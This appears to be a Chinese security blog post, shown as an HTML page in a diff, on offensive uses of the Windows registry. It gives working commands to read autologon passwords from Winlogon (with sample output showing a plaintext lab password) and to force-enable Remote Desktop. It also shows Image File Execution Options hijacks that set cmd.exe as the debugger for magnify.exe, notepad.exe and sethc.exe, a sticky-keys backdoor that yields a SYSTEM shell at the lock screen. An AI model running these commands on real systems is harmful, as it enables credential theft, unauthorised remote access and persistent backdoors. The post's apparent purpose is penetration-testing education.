@@ -1,0 +1,61 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zhangMini"><title>Windows 注册表利用 · Mini's blog</title><meta name="description" content="Windows 注册表注册表根键类型
+HKEY_CLASSES_ROOT(HKCR): 文件扩展名与应用的关联及OLE信息 
+HKEY_CURRENT_USER(HKCU): 当前用户控制面板选项和桌面等设置，以及映射的网络驱动器等 
+HKEY_LOCAL_MACHINE(HKLM): 计算机配置信"><meta name="keywords" content="Security, life"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Mini's blog</a></h3><div class="description"><p>Nothing lasts forever.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a target="_blank" rel="noopener" href="https://www.caicai.me"> CaiCai </a><span>&</span><a target="_blank" rel="noopener" href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">tags</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Windows 注册表利用</a></h3></div><div class="post-content"><h2 id="Windows-注册表"><a href="#Windows-注册表" class="headerlink" title="Windows 注册表"></a>Windows 注册表</h2><h4 id="注册表根键类型"><a href="#注册表根键类型" class="headerlink" title="注册表根键类型"></a>注册表根键类型</h4><ul>
+<li>HKEY_CLASSES_ROOT(HKCR): 文件扩展名与应用的关联及OLE信息 </li>
+<li>HKEY_CURRENT_USER(HKCU): 当前用户控制面板选项和桌面等设置，以及映射的网络驱动器等 </li>
+<li>HKEY_LOCAL_MACHINE(HKLM): 计算机配置信息，例如硬件、操作系统设置和应用程序等</li>
+<li>HKEY_USERS(HKU): 所有登陆用户的配置文件</li>
+<li>HKEY_CURRENT_CONFIG(HKCC): 当前硬件配置信息</li>
+</ul>
+<h4 id="键值类型"><a href="#键值类型" class="headerlink" title="键值类型"></a>键值类型</h4><p>键值类型由常用的6种组成</p>
+<ul>
+<li>REG_SZ: 字符串值</li>
+<li>REG_BINARY: 二进制值</li>
+<li>REG_DWORD: 32位值</li>
+<li>REG_QWORD: 64位值</li>
+<li>REG_MULTI_SZ: 多字符串值</li>
+<li>REG_EXPAND_SZ: 可扩充字符串值</li>
+</ul>
+<h4 id="reg-命令语法"><a href="#reg-命令语法" class="headerlink" title="reg 命令语法"></a><code>reg</code> 命令语法</h4><ul>
+<li>显示语法帮助信息<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg /?</span><br><span class="line"></span><br><span class="line">Operation  [ QUERY   | ADD    | DELETE  | <span class="built_in">COPY</span>    |</span><br><span class="line">             SAVE    | LOAD   | UNLOAD  | <span class="built_in">RESTORE</span> |</span><br><span class="line">             COMPARE | EXPORT | IMPORT  | FLAGS ]</span><br></pre></td></tr></table></figure></li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg query /?</span><br><span class="line">#</span><br><span class="line">reg add /?</span><br><span class="line"># ...</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="抓取-windows-自动登录用户密码"><a href="#抓取-windows-自动登录用户密码" class="headerlink" title="抓取 windows 自动登录用户密码"></a>抓取 windows 自动登录用户密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到包含如下结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DefaultUserName    REG_SZ    yuxuan</span><br><span class="line">DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L</span><br><span class="line">DefaultDomainName  REG_SZ    xiaorang.lab</span><br></pre></td></tr></table></figure>
+
+<h3 id="开启远程桌面连接"><a href="#开启远程桌面连接" class="headerlink" title="开启远程桌面连接"></a>开启远程桌面连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p>语法说明：</p>
+<ul>
+<li><code>/v</code>: 指定要添加或修改的注册表项的名称<ul>
+<li><code>/ve</code>: 指定添加到注册表中的项为空值</li>
+</ul>
+</li>
+<li><code>/t</code>: 指定注册表项的数据类型</li>
+<li><code>/d</code>: 指定注册表项的数据值</li>
+<li><code>/f</code>: 强制执行操作，不提示确认</li>
+</ul>
+<h3 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h3><p>Image File Execution Options (IFEO) 是为一些在默认系统环境中运行时可能引发错误的程序提供特殊的环境设定。默认是只有<strong>管理员</strong>和 <strong>local system</strong> 有权读写修改</p>
+<p>Image Hijack 原理：一个程序要运行时，会先检查注册表，如果有指定程序并且开启了 debugger，那么会优先执行 debugger 指定的程序，这样也就造成了映像劫持</p>
+<p>注册表的位置在 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>，这个注册表项有很多 exe 程序，可以通过修改这些表项来实现劫持的效果，当然也可以自己添加一个指定的 exe 表项实现劫持</p>
+<p>使用 <code>get-acl</code> 查看用户对注册表的权限</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get-acl</span> <span class="literal">-path</span> <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | <span class="built_in">fl</span> *</span><br><span class="line"><span class="comment"># `fl` 将输出格式化为列表的形式</span></span><br></pre></td></tr></table></figure>
+
+<p>如果注册表配置权限错误，如下所示：</p>
+<img src="/2025/02/16/Win-Reg/get-acl.png" class="" title="get-acl">
+
+<p><code>NT AUTHORITY\Authenticated Users</code> 指所有通过身份验证的用户，都可以设置注册表项的值 (<code>SetValue</code>)、创建子键 (<code>CreateSubKey</code>)、读取注册表键值 (<code>ReadKey</code>)</p>
+<p>这会导致所有用户都可以写入注册表，攻击者可以利用 Image Hijack 进行劫持</p>
+<h4 id="劫持放大镜打开-cmd"><a href="#劫持放大镜打开-cmd" class="headerlink" title="劫持放大镜打开 cmd"></a>劫持放大镜打开 cmd</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>点击 开始-&gt;锁定-&gt;放大镜，点击后会获得一个 system 权限的 cmd 端口</p>
+<h4 id="劫持-notepad-打开-cmd"><a href="#劫持-notepad-打开-cmd" class="headerlink" title="劫持 notepad 打开 cmd"></a>劫持 notepad 打开 cmd</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot; /reg:32</span><br></pre></td></tr></table></figure>
+
+<h4 id="劫持-shift-后门打开-cmd"><a href="#劫持-shift-后门打开-cmd" class="headerlink" title="劫持 shift 后门打开 cmd"></a>劫持 shift 后门打开 cmd</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>点击 开始-&gt;锁定-&gt;按5次shift</p>
+</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2025-02-16</span><i class="fa fa-tag"></i><a class="tag" href="/tags/intranet/" title="intranet">intranet </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2025/02/16/Win-Reg/,Mini's blog,Windows 注册表利用,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2025/02/16/mimikatz/" title="mimikatz">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2025/02/15/Impacket-tools/" title="Impacket-tools">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
